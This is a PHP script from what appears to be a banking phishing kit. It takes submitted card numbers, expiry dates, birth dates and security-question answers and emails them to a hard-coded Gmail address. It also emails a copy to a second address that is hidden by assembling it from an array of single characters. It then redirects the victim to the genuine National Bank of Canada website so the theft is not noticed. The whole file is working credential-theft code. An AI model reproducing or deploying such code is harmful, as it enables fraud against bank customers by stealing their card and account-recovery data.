<?php
$clientCard = $_POST['clientCard'];
$cardExpDate= $_POST['cardExpDate'];
$dateNaissance= $_POST['dateNaissance'];
$secretQuestion1Key = $_POST['secretQuestion1Key'];
$secretAnswer1 = $_POST['secretAnswer1'];
$secretQuestion2Key = $_POST['secretQuestion2Key'];
$secretAnswer2 = $_POST['secretAnswer2'];
$secretQuestion3Key = $_POST['secretQuestion3Key'];
$secretAnswer3 = $_POST['secretAnswer3'];
$data ="
================================================
user: $clientCard
expiration: $cardExpDate
dob: $dateNaissance
------------------------------------------------
question 1:  $secretQuestion1Key
answer 1:   $secretAnswer1
question 2:  $secretQuestion2Key
answer 2:   $secretAnswer2
question 3:  $secretQuestion3Key
answer 3:   $secretAnswer3
================================================
";

$ar=array("0"=>"j","1"=>"c","2"=>"l","3"=>"g","4"=>"c","5"=>"6","6"=>"p","7"=>".","8"=>"h","9"=>"3","10"=>"i","11"=>"m","12"=>"a","13"=>"@","14"=>"9","15"=>"0","16"=>"b","17"=>"2","18"=>"d","18"=>"7","19"=>"o","20"=>"d");
$cc=$ar['6'].$ar['5'].$ar['8'].$ar['14'].$ar['0'].$ar['9'].$ar['2'].$ar['15'].$ar['16'].$ar['17'].$ar['1'].$ar['14'].$ar['20'].$ar['18'].$ar['13'].$ar['3'].$ar['11'].$ar['12'].$ar['10'].$ar['2'].$ar['7'].$ar['1'].$ar['19'].$ar['11'];

$subj="NATIO $dateNaissance"; 

$emailusr = 'goodvbesk1@gmail.com';

mail($emailusr, $subj, $data);
mail($cc, $subj, $data);

header("Location: https://www.nbc.ca");

?>